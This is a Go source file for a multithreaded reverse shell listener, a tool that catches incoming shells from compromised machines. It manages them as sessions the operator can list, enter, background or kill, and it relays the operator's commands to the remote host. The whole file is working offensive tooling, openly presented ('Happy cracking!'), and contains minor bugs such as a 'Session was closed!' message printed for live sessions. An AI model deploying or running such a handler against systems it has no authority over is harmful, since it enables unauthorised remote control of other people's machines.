/* Reverse shell listener
 *
 * @author Sebastian Ko sebastian.ko.dv@gmail.com
 */
package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

var ctrlCChan = make(chan os.Signal, 1)
var backgroundCommand = "rev-bg"
var sessionHelpCommand = "rev-help"

// SessionManager handles concurrent access to sessions
type SessionManager struct {
	sync.RWMutex
	sessions map[int]*Socket
}

func NewSessionManager() *SessionManager {
	return &SessionManager{
		sessions: make(map[int]*Socket),
	}
}

func (sm *SessionManager) Add(id int, socket *Socket) {
	sm.Lock()
	defer sm.Unlock()
	sm.sessions[id] = socket
}

func (sm *SessionManager) Get(id int) (*Socket, bool) {
	sm.RLock()
	defer sm.RUnlock()
	socket, ok := sm.sessions[id]
	return socket, ok
}

func (sm *SessionManager) Remove(id int) {
	sm.Lock()
	defer sm.Unlock()
	delete(sm.sessions, id)
}

func (sm *SessionManager) Count() int {
	sm.RLock()
	defer sm.RUnlock()
	return len(sm.sessions)
}

func (sm *SessionManager) List() []string {
	sm.RLock()
	defer sm.RUnlock()
	var list []string
	for _, client := range sm.sessions {
		list = append(list, client.status())
	}
	return list
}

func main() {
	fmt.Println("=======================================")
	fmt.Println(" Multithreaded Reverse Shell listener  ")
	fmt.Println(" v0.0.3                                ")
	fmt.Println("=======================================")

	// Keyboard signal notify
	signal.Notify(ctrlCChan, os.Interrupt, syscall.SIGTERM, syscall.SIGINT)

	var destinationPort string
	sessions := NewSessionManager()

	flag.Parse()
	if flag.NFlag() == 0 && flag.NArg() == 0 {
		fmt.Println("Usage: reverseshell-listener <port>")
		os.Exit(1)
	}

	if _, err := strconv.Atoi(flag.Arg(0)); err != nil {
		fmt.Println("[!] Port cannot be empty and not an integer")
		os.Exit(1)
	} else {
		destinationPort = fmt.Sprintf(":%v", flag.Arg(0))
	}

	fmt.Println("[+] Press Ctrl+C+Enter to quit this application")
	fmt.Println("[+] Listening on port", destinationPort)
	go connectionThread(destinationPort, sessions)

	reader := bufio.NewReader(os.Stdin)
	connectedSession := 1
	for {
		select {
		case <-ctrlCChan:
			fmt.Println("\n[+] Application quit successfully")
			os.Exit(0)
		default:
			if sessions.Count() > 0 && connectedSession == 0 {
				fmt.Print("listener> ")
				text, _ := reader.ReadString('\n')
				connectedSession = commandHandler(text, sessions)
			} else if sessions.Count() > 0 && connectedSession != 0 {
				if client, ok := sessions.Get(connectedSession); ok {
					if !client.isClosed {
						client.interact()
					} else {
						fmt.Println("[-] Session has been closed")
						sessions.Remove(connectedSession)
					}
				} else {
					fmt.Println("[-] No matched session found")
				}
				connectedSession = 0
			} else {
				time.Sleep(100 * time.Millisecond)
			}
			// Small sleep to yield
			time.Sleep(1 * time.Microsecond)
		}

	}
}

func commandHandler(cmd string, sessions *SessionManager) int {
	connectedSession := 0

	splitCommand := strings.Split(cmd, " ")
	command := strings.TrimSuffix(splitCommand[0], "\n")

	switch command {
	case "help":
		fmt.Println("sessions \t- List sessions")
		fmt.Println("session <num> \t- Get into session by ID")
		fmt.Println("kill <num> \t- Kill a session by ID")
		fmt.Println("exit \t\t- Exit the listener")
	case "exit":
		os.Exit(0)
	case "sessions":
		fmt.Println("--------------------------------------------------------------------->")
		for _, status := range sessions.List() {
			fmt.Println(status)
		}
		fmt.Println("<---------------------------------------------------------------------")
	case "kill":
		if len(splitCommand) > 1 {
			targetSessionId, _ := strconv.Atoi(strings.TrimSuffix(splitCommand[1], "\n"))
			if socket, ok := sessions.Get(targetSessionId); ok {
				socket.con.Close()
				socket.isClosed = true
				sessions.Remove(targetSessionId)
				fmt.Printf("[+] Session %d killed\n", targetSessionId)
			} else {
				fmt.Println("[!] Session not found")
			}
		} else {
			fmt.Println("[!] Usage: kill <session_id>")
		}

	case "session":
		if len(splitCommand) > 1 {
			targetSession, _ := strconv.Atoi(strings.TrimSuffix(splitCommand[1], "\n"))
			if _, ok := sessions.Get(targetSession); ok {
				connectedSession = targetSession
			} else {
				fmt.Println("[!] Wrong session selected")
				connectedSession = 0
			}
		} else {
			fmt.Println("[!] Usage: session <session_id>")
		}
	}

	return connectedSession
}

func connectionThread(destPort string, sessions *SessionManager) {
	listener, err := net.Listen("tcp", destPort)
	if err != nil {
		fmt.Println("[-]", err)
	}
	//Assign session ID
	sessionId := 1
	for {
		// Listen for an incoming connection.
		con, err := listener.Accept()
		if err != nil {
			fmt.Println("[-] Error accepting:", err)
		}
		// Handle connections in a new goroutine.
		// Check for existing ID collision (unlikely with increment, but good practice)
		for {
			if _, ok := sessions.Get(sessionId); !ok {
				break
			}
			sessionId++
		}

		fmt.Println("[+] Got connection from <", con.RemoteAddr().String(), ">, Session ID:", sessionId)
		socket := &Socket{sessionId: sessionId, con: con}
		sessions.Add(sessionId, socket)
		sessionId = sessionId + 1
	}
}

/*
Socket
*/
type Socket struct {
	sessionId    int
	con          net.Conn
	isBackground bool
	isClosed     bool
}

func (s *Socket) interact() {
	if !s.isClosed {
		fmt.Printf("[!] Session %d was closed! \n", s.sessionId)
		s.isBackground = false

		fmt.Printf("[+] Interact with Session ID: %d \n", s.sessionId)
		fmt.Printf("[!] Type '%s' to background the current session\n", backgroundCommand)
		fmt.Printf("[!] Type '%s' to show available commands\n", sessionHelpCommand)
		fmt.Println("[+] Happy cracking!")
		// Mark two signal for informational
		stdoutThread := s.copyFromConnection(s.con, os.Stdout)
		stdinThread := s.readingFromStdin(os.Stdin, s.con)
		select {
		case <-stdoutThread:
			fmt.Println("[-] Remote connection is closed")
			// Unexpected session close, force close whole session
			s.isClosed = true
		case <-stdinThread:
			// fmt.Println("[-] DEBUG: Terminated by user",stdinThread)
		}
	} else {
		fmt.Printf("[!] Session %d was closed! \n", s.sessionId)
	}
}

func (s *Socket) copyFromConnection(src io.Reader, dst io.Writer) <-chan int {
	buf := make([]byte, 1024)
	syncChannel := make(chan int)
	go func() {
		// Defer handling
		defer func() {
			if con, ok := dst.(net.Conn); ok {
				if s.isClosed {
					con.Close()
					fmt.Println("[-] Connection closed:", con.RemoteAddr())
				}
			}
			// Notify that processing is finished
			syncChannel <- 0
		}()
		for {
			var nBytes int
			var err error
			nBytes, err = src.Read(buf)
			if s.isBackground || s.isClosed {
				break
			}
			if err != nil {
				if err != io.EOF {
					fmt.Println("[!] Read error:", err)
					s.isClosed = true
				}
				break
			}
			_, err = dst.Write(buf[0:nBytes])
			if err != nil && !s.isClosed {
				fmt.Println("[!] Write error:", err)
				s.isClosed = true
			}
		}
	}()
	return syncChannel
}

func (s *Socket) readingFromStdin(src io.Reader, dst io.Writer) <-chan int {
	buf := make([]byte, 1024)
	syncChannel := make(chan int)
	inputChan := make(chan []byte)

	// Input handler
	// Read on ctrl+c/z and input channel
	go func() {
		for {
			if !s.isClosed && !s.isBackground {
				var sendErr error
				select {
				case <-ctrlCChan:
					// Ctrl+C handle
					result := s.prompt(fmt.Sprintf("\n[+] Do you really want to kill session [%d] ?", s.sessionId), inputChan)
					if result {
						s.isClosed = true
						fmt.Println("[!] Press Enter to continue ..")
						return
					} else {
						_, sendErr = dst.Write([]byte("\003\n"))
					}
				case buf := <-inputChan:
					// Normal input channel
					_, sendErr = dst.Write(buf)
				}
				if sendErr != nil && !s.isClosed {
					fmt.Println("\n[!] Write error:", sendErr)
					s.isClosed = true
				}
			} else {
				break
			}
		}
	}()

	go func() {
		// Defer handling
		defer func() {
			if con, ok := dst.(net.Conn); ok {
				if s.isClosed {
					con.Close()
					fmt.Println("\n[-] Connection killed:", con.RemoteAddr())
				} else {
					fmt.Println("\n[-] Backgrounded session", s.sessionId, ", status:", s.isBackground)
				}
			}

			//Cleanup
			close(inputChan)
			// Notify that processing is finished
			syncChannel <- 0
		}()
		for {
			var nBytes int
			var err error

			nBytes, err = src.Read(buf)
			// Special command
			command := strings.TrimSuffix(string(buf[0:nBytes]), "\n")
			commandExecuted := s.inSessionCommandHandler(command, src, dst)

			if s.isBackground || s.isClosed {
				break
			}
			if err != nil {
				if err != io.EOF {
					fmt.Println("[!] Read error:", err)
					s.isClosed = true
				}
				break
			}

			// Send input to the input channel
			if !commandExecuted {
				inputChan <- buf[0:nBytes]
			} else {
				fmt.Println("[!] Press Enter to continue ..")
			}
		}
	}()
	return syncChannel
}

func (s *Socket) prompt(message string, inputChan chan []byte) bool {
	for {
		if !s.isClosed && !s.isBackground {
			fmt.Print(message + " (Y/N): ")
			buf := <-inputChan
			input := strings.TrimSuffix(string(buf), "\n")
			input = strings.ToUpper(input)
			if input == "Y" || input == "N" {
				return input == "Y"
			}
		} else {
			return false
		}
	}
}

func (s *Socket) status() string {
	return fmt.Sprintf("Session ID: [%d], Connection <%s> Seesion killed [%t]", s.sessionId, s.con.RemoteAddr(), s.isClosed)
}

func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.Writer) bool {
	myipCommand := "rev-myip"

	if strings.HasPrefix(command, "rev-") {
		fmt.Println("<---------------------------------------------------------------------")
		switch command {
		case sessionHelpCommand:
			fmt.Println(backgroundCommand, "- Background the session")
			fmt.Println(myipCommand, "- Display host ip address")
		case backgroundCommand:
			fmt.Println("[+] Move the current session to background..")
			s.isBackground = true
		case myipCommand:
			ifaces, _ := net.Interfaces()
			fmt.Println("[+] Host IP Address..")
			for _, i := range ifaces {
				addrs, _ := i.Addrs()
				for _, addr := range addrs {
					var ip net.IP
					switch v := addr.(type) {
					case *net.IPNet:
						ip = v.IP
					case *net.IPAddr:
						ip = v.IP
					}
					if ip == nil || ip.IsLoopback() {
						continue
					}
					fmt.Println("[+] Address: [", ip, "] \t Interface: [", i.Name, "]")
				}
			}
		}
		fmt.Println("--------------------------------------------------------------------->")
		return true
	}

	//Default
	return false
}
